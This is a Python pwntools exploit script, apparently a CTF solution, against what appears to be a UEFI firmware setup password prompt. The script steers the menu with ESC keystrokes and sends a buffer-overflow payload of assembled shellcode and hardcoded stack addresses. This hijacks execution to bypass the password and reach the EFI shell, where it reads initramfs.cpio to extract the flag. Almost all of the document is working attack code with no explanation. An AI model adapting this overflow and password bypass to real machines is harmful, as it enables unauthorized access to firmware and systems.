from pwn import *
context.arch = 'amd64'

p = process("./run.py")
res = p.recvline()
p2 = process(res, shell=True)
token = p2.recvline().split(b" ")[2]
p.sendline(token)

for _ in range(5):
  sleep(0.1)
  p.send("\x1b") # ESC
  p.send("\x1b") # ESC
  p.send("\x1b") # ESC
  p.send("\x1b") # ESC

res = p.recvuntil("Password: ")
p.send("A"*4 + "\x0d")
res = p.recvuntil("Password: ")
p.send("A"*4 + "\x0d")
res = p.recvuntil("Password: ")

payload = b"\x90"*2 + b"\x00"
payload += asm('mov ebx, 0x28e132c; mov ecx, 0x88efe083; mov [ebx], ecx; mov rcx, 0x28b0cc0; add rcx, 0x100; push rcx; ret')
payload += b"\x90"*40
# Reconstruct stack:
payload += p64(0x0000000003ebc650)
payload += p64(0x000000000000001f) 
payload += p64(0x0000000003ebc670) 
payload += p64(0x000000000000001f)
payload += p64(0x0000000000000020)
payload += p64(0x0000000000000002)
payload += p64(len(payload))
payload += p64(0x0000000003ebc7c8)
payload += p64(0x00000000028bbb01)
payload += p64(0x00000000028c2240)
payload += p64(0x0000000000000001)
payload += p64(0x0000000000000001)
# Ret:
payload += p64(0x0000000003ebc653)
payload += b"\x0d"
payload = payload.replace(b"\x00", b"\x0a")
p.send(payload)
res = p.recvuntil("seconds to skip")

sleep(0.1)
p.send("\x1b") # ESC
sleep(0.1)
p.send("\x1b") # ESC
sleep(0.1)
res = p.recvuntil("Shell>")
p.send("fs0:\x0d")
res = p.recvuntil("FS0:\>")
p.send("type initramfs.cpio\x0d")
res = p.recvuntil("}")
flag = res[res.index(b"CTF"):]
print(flag.decode())
